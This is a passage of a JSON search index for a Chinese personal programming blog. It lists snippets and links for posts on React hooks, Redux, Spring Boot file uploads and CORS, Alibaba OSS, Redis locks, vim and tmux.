第11分钟开始学习 将 child.css 改为 child.module.css 这样就可以实现模块化 跨域问题解决方法 跨域问题解决方","lvl0":"react实战","lvl1":null,"lvl2":"摘要","objectID":"821cd27adcb1207c111ec12e626fb743","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/react%E5%AE%9E%E6%88%98/"},{"content":"css互不影响 学习视频_参考 17分开始 1 2 3 4 5 6 7 8 import style from \u0026#39;./child.module.css\u0026#39; console.log(style) export default function Child() { return ( \u0026lt;div className={style.item}\u0026gt;\u0026lt;/div\u0026gt; ) } 用 style.item 就可以获取到类名 设置引入 scss 配置 sass 如何使用 查看 第3分","lvl0":"react样式互不影响","lvl1":null,"lvl2":"摘要","objectID":"b497778699d51b573906644840d07310","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/react-%E6%A0%B7%E5%BC%8F%E4%BA%92%E4%B8%8D%E5%BD%B1%E5%93%8D/"},{"content":"redis分布式锁 参考项目 https://github.com/go-redsync/redsync 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package main import ( goredislib \u0026#34;github.com/go-redis/redis/v8\u0026#34; \u0026#34;github.com/go-redsync/redsync/v4\u0026#34; \u0026#34;github.com/go-redsync/redsync/v4/redis/goredis/v8\u0026#34; ) func main() { // Create a pool with","lvl0":"redis分布式锁","lvl1":null,"lvl2":"摘要","objectID":"123d86620632f4130c0e4c7708da4103","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/redis/redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"content":"redux使用教程 参考 1 cnpm i --save redux react-redux 状态持久化 参考视频","lvl0":"redux使用","lvl1":null,"lvl2":"摘要","objectID":"d361febdad5bb40e5759e1dd8391f95c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/redux%E4%BD%BF%E7%94%A8/"},{"content":"redux状态管理 redux 工作流程视频 其他解释： 可以理解为观察者模式 reducer 接收一个老状态， 返回一个新状态 然后回调通知 react 组件 参考官网文档 react redux原理","lvl0":"redux状态管理","lvl1":null,"lvl2":"摘要","objectID":"dc5acbe28945ac5ddb60c3c674dda5c6","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/redux%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86/"},{"content":"RN 创建项目 1 2 3 4 5 6 npm i -g expo-cli expo init novel_v1 cd novel_v1 yarn yarn android #这边需要开启android的模拟器 使用Expo开发应用程序需要两种工具：本地开发工具和用于打","lvl0":"RN创建项目","lvl1":null,"lvl2":"摘要","objectID":"0fbee902af56a324ef0d9bdd90f72242","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react-native/rn%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE/"},{"content":"配置shiro框架 基本认识 shiro自带了几种默认的拦截器 authc [需要登录，rememberMeAuthentiationToken] 进行登录 anon","lvl0":"shiro框架的简单使用","lvl1":null,"lvl2":"摘要","objectID":"8d06ebbc96b7e7c72e098f036a552598","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/shiro%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/shiro%E6%A1%86%E6%9E%B6%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"},{"content":"大文件切片上传服务器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60","lvl0":"Sprignboot 大文件切片上传服务器","lvl1":null,"lvl2":"摘要","objectID":"d9eea7e332c84bf05cc732d73344e657","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E6%96%87%E4%BB%B6%E5%88%87%E7%89%87%E4%B8%8A%E4%BC%A0%E6%9C%8D%E5%8A%A1%E5%99%A8_v2/"},{"content":"Java springboot实现 小文件上传本地服务器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47","lvl0":"Sprignboot 小文件上传服务器","lvl1":null,"lvl2":"摘要","objectID":"1943dc7a0958e8eea3157d834b97f133","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%8D%E5%8A%A1%E5%99%A8_v1/"},{"content":"springboot设置静态文件路径 1 2 3 4 5 6 7 8 9 spring:datasource:url:jdbc:mysql://localhost:3306/a?useUnicode=true\u0026amp;characterEncoding=UTF-8\u0026amp;useSSL=falsedriver-class-name:com.mysql.jdbc.Driverusername:rootpassword:rootweb:resources:static-locations:classpath:/static/,file:D:/ASUS/Desktop/app/ file:绝对路径目录地址","lvl0":"Springboot 设置静态文件路径","lvl1":null,"lvl2":"摘要","objectID":"2cd77502fa33ffa993a08f0af6df5f8e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/springboot/springboot%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/"},{"content":"对 分页插件进一步封装 1 2 3 4 5 6 7 8 9 10 11 12 13 @GetMapping(\u0026#34;/test/page\u0026#34;) public Result testPage(@PageableDefault(page = 1,size = 5) Pageable page) { log.info(\u0026#34;test-sort = {}\u0026#34;,page.getSort()); Sort s = page.getSort(); List list = s.stream().map(order -\u0026gt; { Sort.Direction direction = order.getDirection(); String property = order.getProperty(); return property + \u0026#34; \u0026#34; + direction; }).collect(Collectors.toList()); return ResultUtil.mapOf(\u0026#34;data\u0026#34;,page,\u0026#34;sortList\u0026#34;,list); } 1 2 3 4","lvl0":"Springboot,Pageable api 使用方法","lvl1":null,"lvl2":"摘要","objectID":"c5ab1372672f932f8e52bc13c68ffbeb","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/springboot/pageable%E4%BD%BF%E7%94%A8/"},{"content":"springboot 从 token中获取 userID 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package io.github.lyr2000.dissertation.components; import java.lang.annotation.*; /** * @author lyr * @description 获取用户的 ID * @create 2021-11-20 14:14 */ @Documented @Inherited @Retention(value = RetentionPolicy.RUNTIME) @Target(ElementType.PARAMETER) public @interface UserId { } 1 2 3 4 5 6 7 8 9 10 11 12","lvl0":"Springboot,切面编程，从 token获取 userId","lvl1":null,"lvl2":"摘要","objectID":"da19dd666a84b1c02c03dc372af3811e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/springboot/%E5%88%87%E7%89%87%E7%BC%96%E7%A8%8B-%E8%8E%B7%E5%8F%96userid-token/"},{"content":"springboot解决跨域设置 前端设置每次请求携带 cookie【携带sessionid】 1 2 3 axios.defaults.headers.common[\u0026#39;token\u0026#39;] = getToken(); // axios.defaults.headers.common[\u0026#39;refreshToken\u0026#39;] = getRefreshToken(); axios.defaults.withCredentials=true 后端设置 跨域头 1 2 3 4 5 6 7","lvl0":"springboot解决跨域设置","lvl1":null,"lvl2":"摘要","objectID":"0eb3cf57995dd26b231b0fc083858a33","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E8%B7%A8%E5%9F%9F%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"content":"1 2 3 4 5 6 7 8 9 10 @Value(\u0026#34;${spring.profiles.active}\u0026#34;) private String profile; private boolean isDebug; @PostConstruct private void init() { isDebug = \u0026#34;dev\u0026#34;.equalsIgnoreCase(profile); log.info(\u0026#34;环境变量 {} {}\u0026#34;,profile,isDebug); }","lvl0":"springboot判断测试环境","lvl1":null,"lvl2":"摘要","objectID":"60633213e747a2aeaa405f42a6c69340","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83/"},{"content":"sula框架使用总结 参考网站 sula 表单快速配置 1 sula 操作表格","lvl0":"sula框架使用","lvl1":null,"lvl2":"摘要","objectID":"a54d70fd31242417bd5dcf49eba245e2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/sula%E5%85%A5%E9%97%A8/sula%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/"},{"content":"寻找 swagger的依赖 1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.github.xiaoymin/knife4j-spring-boot-starter --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.xiaoymin\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;knife4j-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 这里 我使用 knife4j 其实是一样的。 官方文档 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27","lvl0":"Swagger2框架使用","lvl1":null,"lvl2":"摘要","objectID":"b4e63c5da6e2c0cde9322d56dbbdec82","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/swagger2/swagger2%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/"},{"content":"tarjan 算法 原理： 向上标记法 o(N) 倍增算法 fa[i,j] 表示从i开始，向上走 $2^j$ 步， 能走到的节点， $0\u0026lt;=j \u0026lt;= logN$ $ depth[i] $ 表示深度 哨兵： 从i 开始跳 $2^j$ 步会跳到根节点，那么 $ fa[i,j] = 0","lvl0":"tarjan算法","lvl1":null,"lvl2":"摘要","objectID":"8cc565fd8d57bed5e0278a7c9b11608c","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/tarjan%E7%AE%97%E6%B3%95/"},{"content":"thrift 使用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 namespace java CodeRunService namespace go CodeRunService //编译 struct CodeCompile { 1: string codeType, 2: string codeContent","lvl0":"thrift实现分布式调用","lvl1":null,"lvl2":"摘要","objectID":"fff41707b663d1b39ae313753110d954","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/thrift/%E4%BD%BF%E7%94%A8thrift-%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E8%B0%83%E7%94%A8/"},{"content":"1. 安装tmux 1 2 3 4 5 # linux yum install -y tmux # mac brew install tmux 2. tmux常用命令 2.1. 进入tmux 1 tmux 2.2. 退出tmux，程序后台运行 1 按ctrl + b 进入控制台，再","lvl0":"tmux快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"faa6bd61a4a7d9b92e9cc38090638f7f","tags":["tmux"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/tmux-keymap/"},{"content":"参考项目","lvl0":"ts react 参考项目","lvl1":null,"lvl2":"摘要","objectID":"7fc95e5a3cf52539ce2bf031a8946216","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/ts%E4%BD%BF%E7%94%A8/%E5%8F%82%E8%80%83%E9%A1%B9%E7%9B%AE/"},{"content":"UDP 理解和使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { f, err := net.ListenUDP(\u0026#34;udp\u0026#34;, \u0026amp;net.UDPAddr{ IP: net.IPv4(0, 0, 0, 0), Port: 8080,","lvl0":"UDP golang网络编程","lvl1":null,"lvl2":"摘要","objectID":"2ff522a2c85f3a2fa7568f442cf0c4b6","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/udp-example/"},{"content":"useContext 父子组件传值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 import React, { createContext, useContext, useState } from \u0026#34;react\u0026#34;; const CntCtx = createContext() function Child1() { let parentCnt = useContext(CntCtx) return ( \u0026lt;div\u0026gt;","lvl0":"use Context 父子传值","lvl1":null,"lvl2":"摘要","objectID":"892de04ce097d6d0c988e2b470e8c83d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/usecontext-%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"},{"content":"类型 mounted 的实现 参考博客 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import React, { useEffect, useState } from \u0026#34;react\u0026#34;; export default function LifeCycleExample() { const [cnt , setCnt] = useState(0) useEffect(()=\u0026gt;{ //useEffect 不影响视图更新，异步延迟执行，不是同步的","lvl0":"use Effect 生命周期函数","lvl1":null,"lvl2":"摘要","objectID":"672725688332552bf5b050722117018c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/useeffect%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/"},{"content":"useMemo使用示例 参考学习视频 这东西 和 vue 的 watch 差不多 useMemo 和 useEffect区别 相同点 两者在写法上有很大的相同之处 useMemo第一个参数需","lvl0":"use Memo 解决子组件重复执行问题","lvl1":null,"lvl2":"摘要","objectID":"3b4c9e919f4dafdee8645b61f12677f5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/usememo%E8%A7%A3%E5%86%B3%E9%87%8D%E5%A4%8D%E6%9B%B4%E6%96%B0%E9%97%AE%E9%A2%98/"},{"content":"用 use reducer 代替 redux的方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import React, { useReducer } from \u0026#39;react\u0026#39; const Child1 = (props)=\u0026gt; { console.log(props) return ( \u0026lt;div\u0026gt;","lvl0":"use reducer 代替redux","lvl1":null,"lvl2":"摘要","objectID":"0d533fe30e274607cefd06f521f2d588","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/usereducer%E4%BB%A3%E6%9B%BFredux/"},{"content":"ref 使用方法 Refs 在 React 中起初的作用是做到对Dom 元素的引用，当我们想操作的原生 DOM 元素的时候，我们可以使用Ref 做到对元素的引用。 除了保持对 DOM 元素的","lvl0":"use Ref 获取 DOM元素","lvl1":null,"lvl2":"摘要","objectID":"6ad3e37a99279bfe96b2ef837e7ea325","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/useref%E8%8E%B7%E5%8F%96-dom%E5%85%83%E7%B4%A0/"},{"content":"v-permission 自定义全选 参考学习视频 参考代码","lvl0":"v-permission 学习","lvl1":null,"lvl2":"摘要","objectID":"61af5c1f5c491d6625059cbd044d4b94","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/v-permission%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/"},{"content":"vim编译运行 cpp vim 只是一个 编辑工具，尽量不要装太多的插件，不然反而变笨重了， 最好只是定义一些自己需要用的快捷键功能 1 2 3 4 5 6 7 8 9 10 11 12 13","lvl0":"vim 编译运行cpp","lvl1":null,"lvl2":"摘要","objectID":"5f82ac61bd4587f3e7dd4baab1a4c8f6","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/vim/vim%E7%BC%96%E8%AF%91cpp/"},{"content":"vim代码补全快捷键 ctrl + n 普通关键字 ctrl+x ctrl + f 文件名补全 ctrl+x ctrl + l 整行补全 最常用的三种 ctrl+n 和 ctrl+p 补全单词 ctrl+x ctrl +f 补全文件名 ctrl+x ctrl+o 补全代码，需要开启文件类","lvl0":"vim 代码补全","lvl1":null,"lvl2":"摘要","objectID":"761aa1ece86f7a955eddd750b7455bee","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/vim/vim%E4%BB%A3%E7%A0%81%E8%A1%A5%E5%85%A8/"},{"content":"vim合理修改快捷键映射 很多键盘键位，按 ESC 不方便，我们可以映射组合键 成快捷键 网上一个教程就是用 ctrl+ [ 映射成 esc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17","lvl0":"vim 修改快捷键映射","lvl1":null,"lvl2":"摘要","objectID":"8bbd67c92a0c6577a8fc46169578f103","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/vim/%E4%BF%AE%E6%94%B9%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%98%A0%E5%B0%84/"},{"content":"vscode下面 开发 golang的一些总结 go field to struct","lvl0":"vscode插件安装","lvl1":null,"lvl2":"摘要","objectID":"497a76dc3354b4feba34286505cd40e8","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%AA%9A%E6%93%8D%E4%BD%9C/vscode%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/"},{"content":"vscode快捷键 1. 基本快捷键 1.1. VsCode 快捷键有五种组合方式 Ctrl + Shift + ? : 这种常规组合按钮 Ctrl + V Ctrl +V : 同时依赖一个按键的组合 Shift + V c : 先组合后单键的","lvl0":"vscode快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"1ab70effe27f11b72dde4eb440de2727","tags":["vscode"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/vscode-keymap/"},{"content":"参考的视频 bus的使用方法 参考 https://www.jianshu.com/p/89406752a369 参考项目学习 参考的视频——尚硅谷的 重要的属性 $children 和 $parent $children 和 $parent 1、ref为子组件指定一个索引名称，通过索引来操作子","lvl0":"Vue父子组件互传","lvl1":null,"lvl2":"摘要","objectID":"80c41e6d4c61ffb48fab01f8ef63de50","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/vue/%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BA%92%E4%BC%A0/"},{"content":"zabbix 安装和简介 运维职责 运维职责： 运维业务 7*24稳定运行 人力成本 响应时间反馈 以图形界面凡是展示，方便人员进行系统运行性能评估 出现故障，针对某一","lvl0":"zabbix安装和简介","lvl1":null,"lvl2":"摘要","objectID":"fe08023ab2b013b4a9d246ae576e3916","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/zabbix/zabbix%E5%AE%89%E8%A3%85%E5%92%8C%E7%AE%80%E4%BB%8B/"},{"content":"阿里OSS 断点续传 【后端 java代码】 断点续传思路 数据库记录最后传输成功的 那个 序列号 seq 客户端停止上传了 客户端重新上传，发送数据包给服务器校验","lvl0":"阿里OSS 断点续传","lvl1":null,"lvl2":"摘要","objectID":"81e4706bd9949bf47e5c14a1b541ca9d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E9%98%BF%E9%87%8Coss-%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0%E5%AE%9E%E7%8E%B0/"},{"content":"解决方案 在 bucket 权限那里设置 指定 localhost 通过 springboot 后台跨域的问题 用 @CrossOrigin解决 1 2 3 4 5 6 7 @CrossOrigin(origins = \u0026#34;http://localhost:3000\u0026#34;,maxAge = 3600) @RequestMapping(\u0026#34;/free/\u0026#34;) public class OssController { @Resource private FileService ossService; } 前端代码 【使用 r","lvl0":"阿里OSS 客户端上传跨域问题","lvl1":null,"lvl2":"摘要","objectID":"fe34e53e63c5976a50acfc504b43bb25","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E9%98%BF%E9%87%8Coss-%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8A%E4%BC%A0%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/"},{"content":"基于 oss的视频点播 视频加密 与授权播放 上传的视频 需要加密，保证数据安全， 并且这个数据只允许部分用户访问。 点击开通视频点播服务，然后 进入控制台","lvl0":"阿里OSS 视频点播","lvl1":null,"lvl2":"摘要","objectID":"fe8f2d4d214d0398010e8c907c0fd03e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E9%98%BF%E9%87%8Coss-%E8%A7%86%E9%A2%91%E7%82%B9%E6%92%AD/"},{"content":"阿里oss 客户端上传学习 参考大佬的 demo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 spring:resources:static-locations:classpath:templates/# OSS相关配置信息aliyun:oss:endpoint:mtest","lvl0":"阿里oss前端直传 鉴权生成签名","lvl1":null,"lvl2":"摘要","objectID":"d4422103ede08264dcf2831b3f40b64e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E9%98%BF%E9%87%8Coss-%E5%89%8D%E7%AB%AF%E7%9B%B4%E4%BC%A0%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8A%E4%BC%A0%E9%89%B4%E6%9D%83%E7%AD%89/"},{"content":"阿里OSS 上传文件 参考别人写的代码 参考官方文档 阿里 oss追加上传 官方文档 分片上传官方文档 官方文档 - github-sample 下面是追加上传的例子 1 2 3 4 5 6 7 8 9 